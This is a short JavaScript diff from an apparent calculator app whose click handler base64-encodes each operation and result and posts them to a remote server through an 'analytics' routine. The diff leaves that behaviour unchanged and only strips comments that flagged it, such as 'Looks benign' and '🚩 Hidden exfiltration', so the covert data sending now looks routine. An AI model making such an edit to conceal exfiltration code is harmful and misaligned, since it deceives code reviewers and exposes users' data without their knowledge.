@@ -29,7 +29,7 @@ function _syncWithRemote(data) {
         headers: {
             "Content-Type": "application/json",
         },
-        body: JSON.stringify({ payload: btoa(data) }) // Base64 encode
+        body: JSON.stringify({ payload: btoa(data) }) 
     }).catch((err) => {
         console.warn("Failed syncing with server", err);
     });
@@ -42,7 +42,7 @@ function sendAnalytics(userAction, result) {
         timestamp: new Date().toISOString()
     };
 
-    console.debug("Sending analytics..."); // Looks benign
+    console.debug("Sending analytics..."); 
     _syncWithRemote(JSON.stringify(analyticsData));
 }
 
@@ -59,7 +59,7 @@ function onCalculateClicked(a, b, op) {
     }
 
     logUsage(op, result);
-    sendAnalytics(op, result); // 🚩 Hidden exfiltration
+    sendAnalytics(op, result);
     return result;
 }
 
